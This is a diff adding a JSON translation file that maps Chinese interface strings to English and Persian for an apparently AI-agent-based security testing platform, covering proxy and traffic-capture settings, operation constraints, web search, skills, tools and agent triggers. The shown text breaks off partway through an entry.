@@ -1,0 +1,1182 @@
+{
+  "更新到 ": {
+    "en": "Update to ",
+    "fa": "به‌روزرسانی به "
+  },
+  "回滚到上一版本": {
+    "en": "Roll back to the previous version",
+    "fa": "بازگشت به نسخه قبلی"
+  },
+  "一键更新依赖守护脚本重启程序。请通过": {
+    "en": "One-click update relies on the supervisor script to restart the program. Please start it with",
+    "fa": "به‌روزرسانی یک‌کلیکی برای راه‌اندازی مجدد برنامه به اسکریپت نگهبان وابسته است. لطفاً با"
+  },
+  "（Windows 为": {
+    "en": " (on Windows,",
+    "fa": " (در ویندوز،"
+  },
+  "）启动 ARTEX；直接运行 artex 本体时，程序退出后不会被自动拉起。": {
+    "en": ") to start ARTEX. If you run the artex binary directly, it will not be brought back up automatically after it exits.",
+    "fa": ") ARTEX را اجرا کنید. اگر خود فایل artex را مستقیماً اجرا کنید، پس از خروج، برنامه به‌طور خودکار دوباره بالا نمی‌آید."
+  },
+  "搜索测试成功 · ": {
+    "en": "Search test succeeded · ",
+    "fa": "آزمایش جستجو موفق بود · "
+  },
+  " 条结果": {
+    "en": " results",
+    "fa": " نتیجه"
+  },
+  "开启后，所有 Agent 的 HTTP 流量经记录代理全量落库，并向 Agent 注入 traffic_search / traffic_get\n              工具与代理配置（提示词含代理说明）。": {
+    "en": "When enabled, all Agent HTTP traffic is stored in full through the recording proxy, and the traffic_search / traffic_get tools plus proxy settings are injected into the Agent (the prompt includes proxy instructions).",
+    "fa": "با فعال‌سازی، تمام ترافیک HTTP مربوط به Agent از راه پروکسی ثبت به‌طور کامل ذخیره می‌شود و ابزارهای traffic_search / traffic_get به‌همراه تنظیمات پروکسی به Agent تزریق می‌شوند (پرامپت شامل توضیح پروکسی است)."
+  },
+  "关闭（默认）时不记录任何流量：Agent": {
+    "en": "When off (the default), no traffic is recorded: the Agent",
+    "fa": "در حالت خاموش (پیش‌فرض) هیچ ترافیکی ثبت نمی‌شود: Agent"
+  },
+  "代理相关内容。切换后会即时重建 Agent 生效。": {
+    "en": "proxy-related content. After you switch, Agents are rebuilt immediately and the change takes effect.",
+    "fa": "محتوای مربوط به پروکسی. پس از تغییر، Agent بلافاصله بازسازی می‌شود و تنظیم اعمال می‌گردد."
+  },
+  "Agent 自动绑定流量": {
+    "en": "Automatic traffic binding for Agents",
+    "fa": "اتصال خودکار ترافیک Agent"
+  },
+  "默认关闭。开启后，漏洞入库时触发的报告 Agent 会核对已有 HTTP 请求/响应，关联对应流量后再编写报告。": {
+    "en": "Off by default. When enabled, the report Agent that runs when a vulnerability is stored checks existing HTTP requests and responses, links the matching traffic, and then writes the report.",
+    "fa": "به‌طور پیش‌فرض خاموش است. با فعال‌سازی، Agent گزارش که هنگام ثبت آسیب‌پذیری اجرا می‌شود درخواست‌ها و پاسخ‌های HTTP موجود را بررسی می‌کند، ترافیک متناظر را پیوند می‌دهد و سپس گزارش را می‌نویسد."
+  },
+  "TCP、未抓包或没有匹配流量时仍可正常上报。此开关不影响流量捕获、人工绑定及已保存证据的查看。 对下一轮 Agent\n              生效；关闭后会立即拒绝新的自动绑定。": {
+    "en": "Reporting still works for TCP, traffic that was not captured, or when nothing matches. This switch does not affect traffic capture, manual binding, or viewing saved evidence. It applies to the next Agent run; turning it off immediately rejects new automatic bindings.",
+    "fa": "برای TCP، ترافیک ضبط‌نشده، یا وقتی ترافیک منطبقی نیست، گزارش همچنان عادی ثبت می‌شود. این کلید روی ضبط ترافیک، اتصال دستی و دیدن شواهد ذخیره‌شده اثری ندارد. از دور بعدی Agent اعمال می‌شود؛ با خاموش کردن، اتصال خودکار جدید فوراً رد می‌شود."
+  },
+  "全局代理": {
+    "en": "Global proxy",
+    "fa": "پروکسی سراسری"
+  },
+  "所有 Agent 的": {
+    "en": "All Agents'",
+    "fa": "همه Agentها"
+  },
+  "，可带": {
+    "en": ", with optional",
+    "fa": "، با امکان"
+  },
+  "认证。留空=直连。": {
+    "en": "authentication. Leave blank for a direct connection.",
+    "fa": "احراز هویت. خالی = اتصال مستقیم."
+  },
+  "（流量仍全量落库，再经此代理出网）；关闭捕获时，直接注入\n              Agent 的 bash / WebFetch 出网。与网络搜索代理、LLM 代理相互独立。": {
+    "en": "(traffic is still stored in full, then sent out through this proxy). When capture is off, it is injected directly into the Agent's bash / WebFetch egress. It is independent of the web-search proxy and the LLM proxy.",
+    "fa": "(ترافیک همچنان کامل ذخیره می‌شود و سپس از این پروکسی خارج می‌گردد). وقتی ضبط خاموش است، مستقیماً به خروجی bash / WebFetch در Agent تزریق می‌شود. از پروکسی جستجوی وب و پروکسی LLM مستقل است."
+  },
+  "的支持（curl\n              可用，部分工具可能忽略）； 若主要用 socks5，建议开启流量捕获——此路径由 MITM\n              亲自拨号，工具无感知、稳定生效。": {
+    "en": "support (curl works; some tools may ignore it). If you mainly use socks5, turn on traffic capture — the MITM dials this path itself, so tools stay unaware of it and it applies reliably.",
+    "fa": "پشتیبانی (curl کار می‌کند؛ بعضی ابزارها ممکن است آن را نادیده بگیرند). اگر بیشتر از socks5 استفاده می‌کنید، ضبط ترافیک را روشن کنید — خود MITM این مسیر را برقرار می‌کند، ابزارها از آن بی‌خبر می‌مانند و پایدار اعمال می‌شود."
+  },
+  "代理地址": {
+    "en": "Proxy address",
+    "fa": "آدرس پروکسی"
+  },
+  "操作约束注入": {
+    "en": "Operation-constraint injection",
+    "fa": "تزریق محدودیت عملیات"
+  },
+  "开启后，把每个任务的": {
+    "en": "When enabled, each task's ",
+    "fa": "با فعال‌سازی، "
+  },
+  "（在任务总览「操作约束」里维护的 allow/deny 条目）拼进对应 Agent\n              的系统提示，用来框定探索边界（如「仅测当前端口」「禁止爆破」）。": {
+    "en": "(the allow/deny entries kept under \"Operation constraints\" in the task overview) are appended to that Agent's system prompt to bound exploration (for example, \"test only the current port\" or \"no brute force\").",
+    "fa": "(موارد allow/deny که در «محدودیت‌های عملیات» نمای کلی وظیفه نگهداری می‌شوند) به پرامپت سیستم همان Agent اضافه می‌شوند تا مرز اکتشاف مشخص شود (مثلاً «فقط پورت فعلی را بیازما» یا «جستجوی فراگیر ممنوع»)."
+  },
+  "可分别控制注入到": {
+    "en": "You can choose separately whether to inject them into",
+    "fa": "می‌توانید جداگانه تزریق به"
+  },
+  "；默认都开。切换即时生效（下一轮读取），无需重建 Agent。关闭后该 Agent 不再看到约束。": {
+    "en": "; both are on by default. A change applies immediately (read on the next round) and does not require rebuilding the Agent. After you turn it off, that Agent no longer sees the constraints.",
+    "fa": "؛ هر دو به‌طور پیش‌فرض روشن‌اند. تغییر بلافاصله اعمال می‌شود (در دور بعد خوانده می‌شود) و نیازی به بازسازی Agent نیست. پس از خاموش کردن، آن Agent دیگر محدودیت‌ها را نمی‌بیند."
+  },
+  "注入规划者（planner）": {
+    "en": "Inject into the planner",
+    "fa": "تزریق به planner"
+  },
+  "注入执行者（worker）": {
+    "en": "Inject into the worker",
+    "fa": "تزریق به worker"
+  },
+  "实验功能": {
+    "en": "Experimental features",
+    "fa": "قابلیت‌های آزمایشی"
+  },
+  "尚在验证中的机制，默认关闭。可能改变 Agent 行为或影响稳定性，请在了解影响后启用。": {
+    "en": "Mechanisms still being validated, off by default. They may change Agent behavior or affect stability. Enable them only after you understand the impact.",
+    "fa": "سازوکارهایی که هنوز در حال بررسی‌اند و به‌طور پیش‌فرض خاموش‌اند. ممکن است رفتار Agent را عوض کنند یا پایداری را تحت تأثیر بگذارند. فقط پس از دانستن اثرشان روشنشان کنید."
+  },
+  "：由模型主动压缩长对话历史（norma v0.4.0）。开启后平台接入的四类 Agent（": {
+    "en": ": the model actively compresses long conversation history (norma v0.4.0). When enabled, the four Agent types connected on the platform (",
+    "fa": ": مدل، تاریخچه طولانی گفتگو را فعالانه فشرده می‌کند (norma v0.4.0). با فعال‌سازی، چهار نوع Agent متصل به سکو ("
+  },
+  "）改用 noa 接管上下文，取代内置压缩，\n              压缩原文会归档到任务工作目录下便于回溯。切换即时生效（对之后启动的运行生效），无需重建 Agent；\n              关闭后立即恢复内置压缩。": {
+    "en": ") use noa to manage context instead of built-in compression. The original text is archived under the task working directory so you can look back at it. The switch applies immediately to runs started afterward, without rebuilding the Agent. Turning it off restores built-in compression at once.",
+    "fa": ") زمینه را با noa مدیریت می‌کنند و فشرده‌سازی داخلی کنار می‌رود. متن اصلی در پوشه کاری وظیفه بایگانی می‌شود تا بعداً بتوان به آن برگشت. تغییر برای اجراهایی که بعداً شروع می‌شوند بلافاصله اعمال می‌شود و نیازی به بازسازی Agent نیست. با خاموش کردن، فشرده‌سازی داخلی فوراً برمی‌گردد."
+  },
+  "这是网络搜索的": {
+    "en": "This is the web search",
+    "fa": "این، جستجوی وب"
+  },
+  "里单独选择是否启用": {
+    "en": ", where you choose separately whether to enable",
+    "fa": "، که جداگانه انتخاب می‌کنید فعال شود یا نه"
+  },
+  "记录代理，独立于流量捕获。": {
+    "en": "the recording proxy, and it is independent of traffic capture.",
+    "fa": "پروکسی ثبت، و از ضبط ترافیک مستقل است."
+  },
+  "来源可选": {
+    "en": "Sources include",
+    "fa": "منبع می‌تواند این‌ها باشد:"
+  },
+  "（需填写 Brave API Key）、": {
+    "en": " (a Brave API Key is required),",
+    "fa": " (Brave API Key لازم است)،"
+  },
+  "（复用当前 LLM 配置）。总开关关闭时，各\n              Agent 的网络搜索开关不可用。": {
+    "en": "(reuses the current LLM configuration). When the master switch is off, web search cannot be turned on for any Agent.",
+    "fa": "(از پیکربندی فعلی LLM استفاده می‌کند). وقتی کلید اصلی خاموش است، جستجوی وب برای Agentها روشن نمی‌شود."
+  },
+  "该来源直接复用": {
+    "en": "This source directly reuses",
+    "fa": "این منبع مستقیماً از"
+  },
+  "。因此它": {
+    "en": ". Therefore it",
+    "fa": ". بنابراین"
+  },
+  "——DeepSeek 的 OpenAI 协议端点不支持服务端搜索。切换 LLM 配置后此来源可能失效。": {
+    "en": "—DeepSeek's OpenAI-protocol endpoint does not support server-side search. This source may stop working after you switch the LLM configuration.",
+    "fa": "—نقطه پایانی پروتکل OpenAI در DeepSeek از جستجوی سمت سرور پشتیبانی نمی‌کند. پس از عوض کردن پیکربندی LLM، این منبع ممکن است از کار بیفتد."
+  },
+  "与其它来源不同，搜索由": {
+    "en": "Unlike other sources, search is performed by ",
+    "fa": "بر خلاف منبع‌های دیگر، جستجو توسط "
+  },
+  "：每次搜索会额外消耗一次模型调用（产生 Token\n                  费用），搜索请求": {
+    "en": ": each search spends an extra model call (which costs Tokens), and the search request",
+    "fa": ": هر جستجو یک فراخوانی اضافه مدل مصرف می‌کند (با هزینه Token)، و درخواست جستجو"
+  },
+  "（无摘要），需要正文时由 WebFetch 抓取。": {
+    "en": "(no snippet). When the page body is needed, WebFetch fetches it.",
+    "fa": "(بدون خلاصه). وقتی متن صفحه لازم باشد، WebFetch آن را می‌گیرد."
+  },
+  "是否满足上述条件由你自行确认，系统不做拦截；可用下方「测试搜索」按钮实际跑一次来验证。": {
+    "en": "You confirm these conditions yourself; the system does not block you. Use the \"Test search\" button below to run one real search and check.",
+    "fa": "برقراری این شرط‌ها را خودتان تأیید می‌کنید؛ سامانه جلوی شما را نمی‌گیرد. با دکمه «آزمایش جستجو» در پایین یک جستجوی واقعی بزنید و بررسی کنید."
+  },
+  "已选择 Brave 但尚未配置 Key —— 在保存 Key 之前，搜索工具不会启用。": {
+    "en": "Brave is selected, but no Key is saved yet — the search tool stays off until you save a Key.",
+    "fa": "Brave انتخاب شده، اما هنوز Key ذخیره نشده است — تا ذخیره Key، ابزار جستجو خاموش می‌ماند."
+  },
+  "免费版额度约 2,000 次/月。前往 https://brave.com/search/api/ 获取 Key。": {
+    "en": "The free plan is about 2,000 queries per month. Get a Key at https://brave.com/search/api/.",
+    "fa": "سهمیه نسخه رایگان حدود ۲۰۰۰ جستجو در ماه است. Key را از https://brave.com/search/api/ بگیرید."
+  },
+  "已选择 Tavily 但尚未配置 Key —— 在保存 Key 之前，搜索工具不会启用。": {
+    "en": "Tavily is selected, but no Key is saved yet — the search tool stays off until you save a Key.",
+    "fa": "Tavily انتخاب شده، اما هنوز Key ذخیره نشده است — تا ذخیره Key، ابزار جستجو خاموش می‌ماند."
+  },
+  "出口代理（可选）": {
+    "en": "Egress proxy (optional)",
+    "fa": "پروکسی خروجی (اختیاری)"
+  },
+  "独立出口代理，仅用于访问搜索端点（VPN/SOCKS 等）。与记录流量的 MITM 代理无关；网络不通时经此代理访问。": {
+    "en": "A separate egress proxy, used only to reach search endpoints (VPN/SOCKS and similar). It is separate from the MITM proxy that records traffic. Use it when the network cannot connect directly.",
+    "fa": "پروکسی خروجی جداگانه، فقط برای رسیدن به نقطه‌های پایانی جستجو (مانند VPN/SOCKS). از پروکسی MITM که ترافیک را ثبت می‌کند جداست. وقتی شبکه مستقیم وصل نمی‌شود، دسترسی از این پروکسی انجام می‌شود."
+  },
+  "用当前配置（来源 + 代理 + Key）实际搜索一次「test」，验证是否可用。": {
+    "en": "Run one real search for \"test\" with the current settings (source + proxy + Key) to see if it works.",
+    "fa": "با تنظیمات فعلی (منبع + پروکسی + Key) یک جستجوی واقعی برای «test» بزنید تا معلوم شود کار می‌کند یا نه."
+  },
+  "自定义脚本 · Python 解释器": {
+    "en": "Custom scripts · Python interpreter",
+    "fa": "اسکریپت سفارشی · مفسر Python"
+  },
+  "类型工具用它跑 Python。开机会自动检测（python3 优先）；此处可手填 venv /\n              特定版本的绝对路径，留空则运行时自动检测。": {
+    "en": "type tools use this to run Python. It is detected automatically at startup (python3 first). You can enter the absolute path of a venv or a specific version here. Leave it blank to detect it at runtime.",
+    "fa": "ابزارهای این نوع Python را با آن اجرا می‌کنند. هنگام روشن شدن خودکار پیدا می‌شود (اول python3). اینجا می‌توانید مسیر مطلق یک venv یا نسخه مشخص را بنویسید. خالی بگذارید تا هنگام اجرا پیدا شود."
+  },
+  "重新检测": {
+    "en": "Detect again",
+    "fa": "شناسایی دوباره"
+  },
+  "工作并发 · Work Agent 数": {
+    "en": "Work concurrency · Work Agent count",
+    "fa": "هم‌زمانی کار · تعداد Work Agent"
+  },
+  "每个任务并发运行的工作 agent 数量（默认 3）。数值越大并发探测越多、消耗也越高。修改后": {
+    "en": "How many work Agents run at once per task (default 3). Higher numbers probe more in parallel and cost more. After you change it, ",
+    "fa": "تعداد Agentهای کاری که در هر وظیفه هم‌زمان اجرا می‌شوند (پیش‌فرض ۳). عدد بزرگ‌تر یعنی کاوش موازی بیشتر و هزینه بالاتر. پس از تغییر، "
+  },
+  "，正在运行的任务不受影响。": {
+    "en": ", tasks that are already running are not affected.",
+    "fa": "، وظیفه‌های در حال اجرا تغییری نمی‌کنند."
+  },
+  "会话输入框发送键位": {
+    "en": "Chat input send key",
+    "fa": "کلید ارسال جعبه گفتگو"
+  },
+  "对话页与任务详情的主 Agent 会话输入框共用此设置，选择后立即生效、无需保存。": {
+    "en": "The main Agent composer on the conversation page and on task details shares this setting. It applies as soon as you choose it, with no need to save.",
+    "fa": "جعبه گفتگوی Agent اصلی در صفحه گفتگو و جزئیات وظیفه از این تنظیم مشترک استفاده می‌کند. با انتخاب، بلافاصله اعمال می‌شود و نیازی به ذخیره نیست."
+  },
+  "该偏好": {
+    "en": "This preference",
+    "fa": "این ترجیح"
+  },
+  "，不随账号同步，换浏览器或清理站点数据后需重新设置。": {
+    "en": ", is not synced with the account, and must be set again after you switch browsers or clear site data.",
+    "fa": "، با حساب همگام نمی‌شود و پس از عوض کردن مرورگر یا پاک کردن داده‌های سایت باید دوباره تنظیم شود."
+  },
+  "发送方式": {
+    "en": "Send method",
+    "fa": "روش ارسال"
+  },
+  " 个被调用过": {
+    "en": " have been called",
+    "fa": " بار فراخوانی شده"
+  },
+  " 个不存在的 skill": {
+    "en": " missing skills",
+    "fa": " skill ناموجود"
+  },
+  "还没有任何 Skill 调用记录。": {
+    "en": "There are no Skill call records yet.",
+    "fa": "هنوز سابقه‌ای از فراخوانی Skill نیست."
+  },
+  "未使用的 Skill": {
+    "en": "Unused Skills",
+    "fa": "Skillهای استفاده‌نشده"
+  },
+  "已安装 Skill：": {
+    "en": "Installed Skill: ",
+    "fa": "Skill نصب‌شده: "
+  },
+  " 个文件）": {
+    "en": " files）",
+    "fa": " فایل）"
+  },
+  "\n\n是否覆盖同名 Skill？": {
+    "en": "\n\nOverwrite the Skill with the same name?",
+    "fa": "\n\nSkill همنام بازنویسی شود؟"
+  },
+  "已创建文件夹：": {
+    "en": "Folder created: ",
+    "fa": "پوشه ساخته شد: "
+  },
+  "已创建文件：": {
+    "en": "File created: ",
+    "fa": "فایل ساخته شد: "
+  },
+  "已删除 Skill：": {
+    "en": "Skill deleted: ",
+    "fa": "Skill حذف شد: "
+  },
+  "关联": {
+    "en": "Link",
+    "fa": "پیوند"
+  },
+  "取消关联": {
+    "en": "Unlink",
+    "fa": "لغو پیوند"
+  },
+  "个未命中调用": {
+    "en": "unmatched calls",
+    "fa": "فراخوانی بی‌تطبیق"
+  },
+  "Agent 点名调用、但技能库里不存在的 skill。按被点名次数排序。": {
+    "en": "Skills the Agent called by name that are not in the skill library. Sorted by how often they were named.",
+    "fa": "skillهایی که Agent با نام صدا زده اما در کتابخانه مهارت نیستند. بر اساس تعداد دفعاتی که نام برده شده‌اند مرتب شده‌اند."
+  },
+  "被调用 ": {
+    "en": "Called ",
+    "fa": "فراخوانی "
+  },
+  " 次 · 最近 ": {
+    "en": " times · last ",
+    "fa": " بار · آخرین "
+  },
+  "最近": {
+    "en": "Recent",
+    "fa": "اخیر"
+  },
+  "关联 MCP": {
+    "en": "Link MCP",
+    "fa": "پیوند MCP"
+  },
+  "删除 Skill「": {
+    "en": "Delete Skill「",
+    "fa": "حذف Skill「"
+  },
+  "删除文件夹「": {
+    "en": "Delete folder「",
+    "fa": "حذف پوشه「"
+  },
+  "删除文件「": {
+    "en": "Delete file「",
+    "fa": "حذف فایل「"
+  },
+  "可见性": {
+    "en": "Visibility",
+    "fa": "نمایان بودن"
+  },
+  "## 执行方法\n\n1. 先探测错误\n2. 区分盲注类型\n\n脚本放 scripts/ 目录。": {
+    "en": "## How to run\n\n1. Probe for errors first\n2. Tell the blind-injection types apart\n\nPut scripts in the scripts/ directory.",
+    "fa": "## روش اجرا\n\n1. ابتدا خطا را بررسی کنید\n2. نوع تزریق کور را جدا کنید\n\nاسکریپت‌ها را در پوشه scripts/ بگذارید."
+  },
+  "已保存工具「": {
+    "en": "Saved tool「",
+    "fa": "ابزار ذخیره شد「"
+  },
+  "已恢复「": {
+    "en": "Restored \"",
+    "fa": "«"
+  },
+  "」为代码默认": {
+    "en": "\" to the code default",
+    "fa": "» به پیش‌فرض کد بازگردانده شد"
+  },
+  "该工具依赖": {
+    "en": "This tool depends on",
+    "fa": "این ابزار وابسته است به"
+  },
+  "。请先在「系统配置」开启流量捕获，才能绑定给 Agent 并启用。": {
+    "en": ". Turn on traffic capture in \"System settings\" before you can bind it to an Agent and enable it.",
+    "fa": ". پیش از اتصال به Agent و فعال‌سازی، ضبط ترافیک را در «تنظیمات سیستم» روشن کنید."
+  },
+  "参数（名称 / 类型 / 必填只读；描述与默认值可改）": {
+    "en": "Parameters (name / type / required are read-only; description and default can be edited)",
+    "fa": "پارامترها (نام / نوع / الزامی فقط‌خواندنی است؛ توضیح و مقدار پیش‌فرض قابل ویرایش است)"
+  },
+  "必填": {
+    "en": "Required",
+    "fa": "الزامی"
+  },
+  "自定义·": {
+    "en": "Custom · ",
+    "fa": "سفارشی · "
+  },
+  " 个匹配，点击卡片编辑描述、参数默认值与 Agent 绑定": {
+    "en": " matches. Click a card to edit the description, parameter defaults, and Agent bindings",
+    "fa": " مورد مطابق. برای ویرایش توضیح، مقدار پیش‌فرض پارامتر و اتصال Agent روی کارت بزنید"
+  },
+  " 个，点击卡片编辑描述、参数默认值与 Agent 绑定": {
+    "en": " items. Click a card to edit the description, parameter defaults, and Agent bindings",
+    "fa": " مورد. برای ویرایش توضیح، مقدار پیش‌فرض پارامتر و اتصال Agent روی کارت بزنید"
+  },
+  " 个匹配，点击卡片编辑": {
+    "en": " matches. Click a card to edit",
+    "fa": " مورد مطابق. برای ویرایش روی کارت بزنید"
+  },
+  "shell(bash 声明) / command(命令) / script(Python) / http(API)，共 ": {
+    "en": "shell (bash declaration) / command (command) / script (Python) / http (API), total ",
+    "fa": "shell (تعریف bash) / command (فرمان) / script (Python) / http (API)، جمع "
+  },
+  " 个，点击卡片编辑": {
+    "en": " items. Click a card to edit",
+    "fa": " مورد. برای ویرایش روی کارت بزنید"
+  },
+  "命令模板（占位符": {
+    "en": "Command template (placeholders",
+    "fa": "قالب فرمان (جانگهدار"
+  },
+  "，如 nmap -p": {
+    "en": ", such as nmap -p",
+    "fa": "، مانند nmap -p"
+  },
+  "URL（可含": {
+    "en": "URL (may include",
+    "fa": "URL (می‌تواند شامل"
+  },
+  "Headers（JSON，可含": {
+    "en": "Headers (JSON, may include",
+    "fa": "Headers (JSON، می‌تواند شامل"
+  },
+  "Body（可含": {
+    "en": "Body (may include",
+    "fa": "Body (می‌تواند شامل"
+  },
+  "走记录代理": {
+    "en": "Send through the recording proxy",
+    "fa": "عبور از پروکسی ثبت"
+  },
+  "参数 JSON Schema": {
+    "en": "Parameter JSON Schema",
+    "fa": "JSON Schema پارامتر"
+  },
+  "deferred（大量不常用工具才开）": {
+    "en": "deferred (turn this on only for a large set of rarely used tools)",
+    "fa": "deferred (فقط وقتی ابزارهای کم‌کاربرد زیادند روشن کنید)"
+  },
+  "已保存为版本 v": {
+    "en": "Saved as version v",
+    "fa": "ذخیره شد به‌صورت نسخه v"
+  },
+  "已恢复为内置默认（v": {
+    "en": "Restored to the built-in default (v",
+    "fa": "به پیش‌فرض داخلی بازگردانده شد (v"
+  },
+  "已取消": {
+    "en": "Canceled",
+    "fa": "لغو شد"
+  },
+  "工具「": {
+    "en": " tool「",
+    "fa": " ابزار「"
+  },
+  "已解绑": {
+    "en": "Unbound",
+    "fa": "جدا شد"
+  },
+  "未找到 Agent：": {
+    "en": "Agent not found: ",
+    "fa": "Agent پیدا نشد: "
+  },
+  "为该 Agent 绑定固定 LLM 配置（点「保存配置」生效）。优先级：Agent 绑定 &gt; 任务/会话指定 &gt; 全局激活。": {
+    "en": "Bind a fixed LLM configuration to this Agent (click \"Save configuration\" to apply). Priority: Agent binding > task or session override > global active configuration.",
+    "fa": "یک پیکربندی ثابت LLM برای این Agent بگذارید (با «ذخیره پیکربندی» اعمال می‌شود). اولویت: اتصال Agent > تعیین وظیفه یا نشست > پیکربندی فعال سراسری."
+  },
+  "为该 Agent 开启后（点上方保存生效），可用持久 PTY 会话工具（shell_open/send/read/close/list）驱动 msfconsole/ssh/REPL 等交互程序": {
+    "en": "Once enabled for this Agent (save above to apply), persistent PTY session tools (shell_open/send/read/close/list) can drive interactive programs such as msfconsole, ssh, and REPLs.",
+    "fa": "پس از روشن کردن برای این Agent (با ذخیره بالا اعمال می‌شود)، ابزارهای نشست پایدار PTY (shell_open/send/read/close/list) می‌توانند برنامه‌های تعاملی مانند msfconsole، ssh و REPL را راه بیندازند."
+  },
+  "示例：": {
+    "en": "Example: ",
+    "fa": "نمونه: "
+  },
+  "预览渲染": {
+    "en": "Preview render",
+    "fa": "پیش‌نمایش رندر"
+  },
+  "所有": {
+    "en": "All",
+    "fa": "همه"
+  },
+  "已由后端用示例值替换。": {
+    "en": "have been replaced by the backend with sample values.",
+    "fa": "توسط بک‌اند با مقدارهای نمونه جایگزین شده‌اند."
+  },
+  "保存为新版本": {
+    "en": "Save as new version",
+    "fa": "ذخیره به‌عنوان نسخه جدید"
+  },
+  "与当前版本对比": {
+    "en": "Compare with the current version",
+    "fa": "مقایسه با نسخه فعلی"
+  },
+  "已加载 v": {
+    "en": "Loaded v",
+    "fa": "نسخه v"
+  },
+  " 到编辑器，确认后点「保存为新版本」": {
+    "en": " into the editor. Review it, then click \"Save as new version\"",
+    "fa": " در ویرایشگر بارگذاری شد. بررسی کنید، سپس «ذخیره به‌عنوان نسخه جدید» را بزنید"
+  },
+  "加载到编辑器": {
+    "en": "Load into the editor",
+    "fa": "بارگذاری در ویرایشگر"
+  },
+  "版本对比：v": {
+    "en": "Version diff: v",
+    "fa": "مقایسه نسخه: v"
+  },
+  "（当前）": {
+    "en": " (current)",
+    "fa": " (فعلی)"
+  },
+  "当此 Agent 因": {
+    "en": "When this Agent is ended by ",
+    "fa": "وقتی این Agent به‌خاطر "
+  },
+  "被终止时，系统会注入这段「收尾提示词」跑一轮收尾：\n            先把已识别但未落库的内容写回，再输出一句总结（避免烂尾）。留空则使用内置默认。": {
+    "en": ", the system injects this wrap-up prompt and runs one closing round: write back anything identified but not yet stored, then output a one-line summary so the run does not end unfinished. Leave blank to use the built-in default.",
+    "fa": "، سامانه این «پرامپت جمع‌بندی» را تزریق می‌کند و یک دور پایانی اجرا می‌کند: هرچه شناسایی شده اما هنوز ذخیره نشده را بنویسید، سپس یک جمله جمع‌بندی بدهید تا کار نیمه‌کاره نماند. خالی بگذارید تا پیش‌فرض داخلی استفاده شود."
+  },
+  "收尾轮数（收尾阶段自身最多跑几轮；0=用内置默认": {
+    "en": "Wrap-up turns (how many rounds the wrap-up phase itself may run; 0 = built-in default",
+    "fa": "تعداد دور جمع‌بندی (خود مرحله جمع‌بندی حداکثر چند دور؛ 0 = پیش‌فرض داخلی"
+  },
+  "轮）": {
+    "en": " turns)",
+    "fa": " دور)"
+  },
+  "到达超时上限、即将结束时注入。\n                与 per-run 语义常相反（如 planner：per-run 说“别停继续规划”，任务超时说“到点停止、做最后判定”）。留空则用内置默认。": {
+    "en": "reaches the timeout limit and is about to end, this prompt is injected. Its meaning is often the opposite of the per-run wrap-up (for a planner, the per-run prompt says \"don't stop, keep planning\", while the task-timeout prompt says \"time is up, stop and make the final call\"). Leave blank to use the built-in default.",
+    "fa": "به سقف زمان می‌رسد و رو به پایان است، این متن تزریق می‌شود. معنا اغلب برعکس جمع‌بندی per-run است (مثلاً planner در per-run می‌گوید «متوقف نشو و به برنامه‌ریزی ادامه بده»، و در پایان زمان وظیفه می‌گوید «وقت تمام است؛ متوقف شو و تصمیم نهایی را بگیر»). خالی بگذارید تا پیش‌فرض داخلی استفاده شود."
+  },
+  "收尾轮数（0=用内置默认": {
+    "en": "Wrap-up turns (0 = built-in default",
+    "fa": "تعداد دور جمع‌بندی (0 = پیش‌فرض داخلی"
+  },
+  "工具调用(": {
+    "en": "Tool calls (",
+    "fa": "فراخوانی ابزار ("
+  },
+  "触发器让这个自定义 Agent 自动运行：每次触发都": {
+    "en": "Triggers run this custom Agent automatically. Each time one fires, it ",
+    "fa": "راه‌اندازها این Agent سفارشی را خودکار اجرا می‌کنند. هر بار که فعال شود، "
+  },
+  "（在「对话」页可见）。\n        可多选触发条件；系统会把「本次为何触发 + 相关任务/finding/目标」自动附加到你写的基础消息后面。": {
+    "en": "(visible on the Conversations page). You can select more than one condition. The system appends why this run fired, plus the related task, finding, and goal, after the base message you wrote.",
+    "fa": "(در صفحه «گفتگو» دیده می‌شود). می‌توانید چند شرط را با هم انتخاب کنید. سامانه دلیل این اجرا را به‌همراه وظیفه، finding و هدف مرتبط، به انتهای پیام پایه شما اضافه می‌کند."
+  },
+  "编辑触发器 #": {
+    "en": "Edit trigger #",
+    "fa": "ویرایش راه‌انداز #"
+  },
+  "（改完点「保存修改」）": {
+    "en": " (click \"Save changes\" when you are done)",
+    "fa": " (پس از ویرایش «ذخیره تغییرات» را بزنید)"
+  },
+  "定时触发": {
+    "en": "Trigger on a schedule",
+    "fa": "فعال‌سازی زمان‌بندی‌شده"
+  },
+  "发现 finding 时触发": {
+    "en": "Trigger when a finding is discovered",
+    "fa": "فعال‌سازی هنگام کشف finding"
+  },
+  "目标达成时触发": {
+    "en": "Trigger when a goal is met",
+    "fa": "فعال‌سازی وقتی هدف محقق شود"
+  },
+  "任务超时时触发": {
+    "en": "Trigger when a task times out",
+    "fa": "فعال‌سازی وقتی زمان وظیفه تمام شود"
+  },
+  "工具调用时触发": {
+    "en": "Trigger on a tool call",
+    "fa": "فعال‌سازی هنگام فراخوانی ابزار"
+  },
+  "选择要监听的工具（至少一个）；任务执行中这些工具每次": {
+    "en": "Choose tools to watch (at least one). While a task is running, every time these tools ",
+    "fa": "ابزارهای تحت نظر را انتخاب کنید (دست‌کم یکی). هنگام اجرای وظیفه، هر بار که این ابزارها "
+  },
+  "都会触发。已选": {
+    "en": " will trigger.",
+    "fa": " فعال می‌شود."
+  },
+  "个。": {
+    "en": "selected",
+    "fa": "مورد انتخاب شده"
+  },
+  "任务创建时触发": {
+    "en": "Trigger when a task is created",
+    "fa": "فعال‌سازی هنگام ساخته شدن وظیفه"
+  },
+  "取消编辑": {
+    "en": "Cancel editing",
+    "fa": "لغو ویرایش"
+  },
+  "定时：": {
+    "en": "Schedule: ",
+    "fa": "زمان‌بندی: "
+  },
+  "目标：": {
+    "en": "Goal: ",
+    "fa": "هدف: "
+  },
+  "超时：": {
+    "en": "Timeout: ",
+    "fa": "پایان زمان: "
+  },
+  "任务创建：": {
+    "en": "Task created: ",
+    "fa": "ساخت وظیفه: "
+  },
+  "工具：": {
+    "en": "Tool: ",
+    "fa": "ابزار: "
+  },
+  "消息：": {
+    "en": "Message: ",
+    "fa": "پیام: "
+  },
+  "无法定位：": {
+    "en": "Could not locate: ",
+    "fa": "مکان پیدا نشد: "
+  },
+  "已展开审批 #": {
+    "en": "Expanded approval #",
+    "fa": "تأیید بازشده #"
+  },
+  " 对应的工具调用": {
+    "en": " and its tool call",
+    "fa": " و فراخوانی ابزار مربوط"
+  },
+  "正在加载审批 #": {
+    "en": "Loading approval #",
+    "fa": "در حال بارگذاری تأیید #"
+  },
+  " 所在的对话位置…": {
